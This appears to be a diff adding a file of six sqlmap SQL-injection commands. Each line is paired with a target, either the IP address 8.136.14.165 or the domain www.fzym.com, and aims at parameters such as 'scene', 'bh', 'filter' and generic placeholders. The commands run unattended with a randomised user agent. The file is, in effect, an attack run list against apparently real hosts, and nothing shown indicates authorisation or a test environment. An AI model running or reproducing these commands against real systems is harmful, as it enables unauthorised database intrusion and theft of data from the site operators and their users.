@@ -1,0 +1,23 @@
+8.136.14.165
+request-baseline
+sqlmap -r "sqlmap_requests_baseline\002_SQL_Injection_scene_3883157333370472110.txt" --batch --smart --random-agent --output-dir "sqlmap_output_baseline\002_3883157333370472110" -p "scene"
+
+8.136.14.165
+request-baseline
+sqlmap -r "sqlmap_requests_baseline\006_SQL_Injection_bh_3883167794493130465.txt" --batch --smart --random-agent --output-dir "sqlmap_output_baseline\006_3883167794493130465" -p "bh"
+
+8.136.14.165
+request-baseline
+sqlmap -r "sqlmap_requests_baseline\007_SQL_Injection_filter_3883167794660902628.txt" --batch --smart --random-agent --output-dir "sqlmap_output_baseline\007_3883167794660902628" -p "filter"
+
+www.fzym.com
+request-baseline
+sqlmap -r "sqlmap_requests_baseline\009_SQL_Injection_{GENERIC}_3883540746938091449.txt" --batch --smart --random-agent --output-dir "sqlmap_output_baseline\009_3883540746938091449" -p "{GENERIC}"
+
+www.fzym.com
+request-baseline
+sqlmap -r "sqlmap_requests_baseline\010_SQL_Injection_{GENERIC}_3883541567813715917.txt" --batch --smart --random-agent --output-dir "sqlmap_output_baseline\010_3883541567813715917" -p "{GENERIC}"
+
+www.fzym.com
+request-baseline
+sqlmap -r "sqlmap_requests_baseline\012_SQL_Injection_{GENERIC}_3883543277940507653.txt" --batch --smart --random-agent --output-dir "sqlmap_output_baseline\012_3883543277940507653" -p "{GENERIC}"
